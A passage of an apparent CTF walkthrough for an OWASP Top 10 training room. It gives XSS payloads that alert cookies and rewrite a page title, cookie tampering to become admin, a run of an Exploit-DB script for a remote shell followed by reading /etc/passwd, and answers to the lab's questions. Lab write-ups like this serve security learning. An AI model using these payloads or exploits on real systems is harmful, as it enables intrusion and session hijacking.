<h4 id="then-add-a-comment-and-see-if-you-can-insert-some-of-your-own-html">Then add a comment and see if you can insert some of your own HTML<a href="#then-add-a-comment-and-see-if-you-can-insert-some-of-your-own-html" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>You can enter any HTML code you want.</p>
{{< highlight html >}}
<html>
    <body>
    <p> Hi </p>
    </body>
</html>
{{< /highlight >}}

<h4 id="on-the-same-page-create-an-alert-popup-box-appear-on-the-page-with-your-document-cookies">On the same page, create an alert popup box appear on the page with your document cookies.<a href="#on-the-same-page-create-an-alert-popup-box-appear-on-the-page-with-your-document-cookies" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Again, google around on how to display cookies in JS, then just write down the command:</p>
{{< highlight html >}}
<script>alert(document.cookies)</script>
{{< /highlight >}}

<h4 id="change-xss-playground-to-i-am-a-hacker-by-adding-a-comment-and-using-js">Change &ldquo;XSS Playground&rdquo; to &ldquo;I am a hacker&rdquo; by adding a comment and using JS.<a href="#change-xss-playground-to-i-am-a-hacker-by-adding-a-comment-and-using-js" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Go to the source code and figure out the document id of the element which has the title stored. Then use simple JS to change the heading (or use the hint :p)</p>
{{< highlight html >}}
    <script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
{{< /highlight >}}

<h2 id="insecure-deserialization">Insecure Deserialization<a href="#insecure-deserialization" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<h3 id="task-21-insecure-deserialization">Task 21: Insecure Deserialization<a href="#task-21-insecure-deserialization" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
<h4 id="who-developed-the-tomcat-application">Who developed the Tomcat application?<a href="#who-developed-the-tomcat-application" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Google around, I initially got the answer as a single person who was responsible for it, but then you get <code>The Apache Software Foundation</code></p>
<h4 id="what-type-of-attack-that-crashes-services-can-be-performed-with-insecure-deserialisation">What type of attack that crashes services can be performed with insecure deserialisation?<a href="#what-type-of-attack-that-crashes-services-can-be-performed-with-insecure-deserialisation" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>DOS, or <code>Denial of Service</code></p>
<h3 id="task-25-cookies-practical">Task 25: Cookies Practical<a href="#task-25-cookies-practical" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
<h4 id="1st-flag-cookie-value">1st flag (cookie value)<a href="#1st-flag-cookie-value" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Follow the instructions mentioned in the text. The cookie value is base64 encoded, hence just use a normal base64 decoder to get the value of the cookies</p>
<h4 id="2nd-flag-admin-dashboard">2nd flag (admin dashboard)<a href="#2nd-flag-admin-dashboard" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Simply change the value of <code>userType=&quot;admin&quot;</code>.</p>
<h2 id="components-with-known-vulnerabilities">Components with Known Vulnerabilities<a href="#components-with-known-vulnerabilities" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<h3 id="task-29-lab">Task 29: Lab<a href="#task-29-lab" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
<h4 id="how-many-characters-are-in-etcpasswd">How many characters are in /etc/passwd<a href="#how-many-characters-are-in-etcpasswd" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Go to exploit DB and see if you can find any exploits for <code>CSE Bookstore</code> or <code>projectworld</code> which will give us remote shell access. As we can see, there is <a href="https://www.exploit-db.com/exploits/47887">one</a>.</p>
<p>Now, we just download them and run the script to execute it. There is sufficient documentation to know how to execute the command</p>
{{< highlight bash >}}
python3 47887.py http://machine_ip/
wc -c /etc/passwd
{{< /highlight >}}

<h2 id="insuffecient-logging-and-monitoring">Insuffecient Logging and Monitoring<a href="#insuffecient-logging-and-monitoring" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
<h3 id="task-30-insuffecient-logging-and-monitoring">Task 30: Insuffecient Logging and Monitoring<a href="#task-30-insuffecient-logging-and-monitoring" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
<h4 id="what-ip-address-is-the-attacker-using">What IP address is the attacker using?<a href="#what-ip-address-is-the-attacker-using" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>Look at the IP adress which is used the most and is unauthorised. As can bee seen, the answer is <code>49.99.13.16</code></p>
<h4 id="what-kind-of-attack-is-being-carried-out">What kind of attack is being carried out?<a href="#what-kind-of-attack-is-being-carried-out" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
<p>From what can be seen, different usernames are used in each request. Also, using the hint, we can find out that the answer is <code>Brute Force</code></p>
